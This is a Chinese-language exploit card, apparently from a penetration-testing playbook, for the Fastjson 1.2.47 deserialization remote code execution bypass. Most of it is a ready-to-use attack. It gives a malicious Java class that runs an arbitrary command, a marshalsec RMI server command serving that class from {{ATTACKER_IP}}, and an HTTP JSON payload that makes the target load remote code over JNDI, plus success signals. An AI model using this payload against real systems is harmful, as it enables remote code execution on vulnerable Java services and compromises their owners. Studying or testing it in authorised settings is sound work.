# Fastjson 1.2.47 Deserialization RCE (1.2.47-rce)

## 指纹特征
- 服务: 使用 Fastjson < 1.2.48 的 Java 应用
- 端口: 8090 (示例)
- 场景: 即使开启了 `autoType` 白名单，也可通过嵌套 `java.lang.Class` 绕过检查。

## 利用矩阵
| 触发方式 | 条件 |
| :--- | :--- |
| JSON 反序列化绕过 | JDK 版本未开启 JNDI 限制 (如 JDK 8u102 以下) |

## PoC 指令

**1. 准备恶意类 (TouchFile.java)**
```java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"{{COMMAND}}"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {}
    }
}
```
编译并部署：`javac TouchFile.java` -> `http://{{ATTACKER_IP}}/#TouchFile`。

**2. 启动 JNDI 引用服务器**
```bash
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://{{ATTACKER_IP}}/#TouchFile" 9999
```

**3. 发送绕过白名单的 Payload**
通过 `java.lang.Class` 将 `JdbcRowSetImpl` 加载进缓存，从而绕过后续的白名单检查：
```http
POST / HTTP/1.1
Host: {{TARGET}}:8090
Content-Type: application/json

{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "rmi://{{ATTACKER_IP}}:9999/TouchFile",
        "autoCommit": true
    }
}
```

## Success Signal
- **物理验证**: 命令执行成功（例如：`touch /tmp/success` 后验证文件存在）。
- **连接回显**: RMI 服务器收到来自目标的连接请求。
